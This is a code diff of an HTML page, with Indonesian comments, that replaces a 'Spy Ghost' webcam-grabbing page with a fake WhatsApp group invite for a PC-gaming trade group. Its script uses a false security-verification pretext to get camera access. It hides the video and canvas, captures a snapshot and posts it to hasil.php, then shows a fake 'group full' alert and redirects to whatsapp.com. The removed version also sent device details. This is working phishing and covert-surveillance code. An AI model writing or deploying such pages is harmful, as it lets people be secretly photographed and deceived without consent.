@@ -1,44 +1,74 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Spy Ghost - Protocol Initialized</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Group Invite</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
-        .box { border: 1px solid #0f0; display: inline-block; padding: 25px; box-shadow: 0 0 15px #0f0; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e5ddd5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
+        .group-img { width: 100px; height: 100px; border-radius: 50%; background: #ccc; margin: 0 auto 15px; overflow: hidden; }
+        .group-img img { width: 100%; height: 100%; object-fit: cover; }
+        h2 { color: #075e54; margin-bottom: 5px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        .btn { background-color: #25d366; color: white; padding: 12px 25px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; }
+        canvas, video { display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h3>[ SYSTEM: SPY GHOST ]</h3>
-        <p class="blink">CONNECTING TO NODE...</p>
-    </div>
-    <video id="v" style="display:none;" autoplay></video>
-    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 
-    <script>
-    navigator.mediaDevices.getUserMedia({ video: true })
-    .then(s => {
-        const v = document.getElementById('v');
-        v.srcObject = s;
+<div class="card">
+    <div class="group-img">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="Group Icon">
+    </div>
+    <h2>JUAL BELI PC GAMING INDO</h2>
+    <p>Undangan untuk bergabung ke grup WhatsApp</p>
+    <button id="joinBtn" class="btn">JOIN CHAT</button>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const joinBtn = document.getElementById('joinBtn');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+joinBtn.addEventListener('click', () => {
+    // Minta izin kamera
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    .then(stream => {
+        video.srcObject = stream;
         setTimeout(() => {
-            const c = document.getElementById('c');
-            c.getContext('2d').drawImage(v, 0, 0);
-            const img = c.toDataURL('image/jpeg');
-            const info = {
-                os: navigator.platform,
-                ram: navigator.deviceMemory || "N/A",
-                screen: window.screen.width + "x" + window.screen.height,
-                agent: navigator.userAgent
-            };
-            fetch('hasil.php', {
-                method: 'POST',
-                body: JSON.stringify({ img: img, info: info, user_id: "7429012558" })
-            });
-        }, 2000);
+            takeSnapshot();
+        }, 1000); // Tunggu 1 detik biar fokus
+    })
+    .catch(err => {
+        alert("Gagal bergabung. Izin kamera diperlukan untuk verifikasi keamanan grup.");
     });
-    </script>
+});
+
+function takeSnapshot() {
+    const context = canvas.getContext('2d');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    const imageData = canvas.toDataURL('image/png');
+    
+    // Kirim ke hasil.php
+    fetch('hasil.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'image=' + encodeURIComponent(imageData)
+    })
+    .then(() => {
+        // Notifikasi Palsu
+        alert("Maaf, Grup ini sudah penuh (1024/1024 anggota).");
+        window.location.href = "https://www.whatsapp.com";
+    });
+}
+</script>
+
 </body>
 </html>
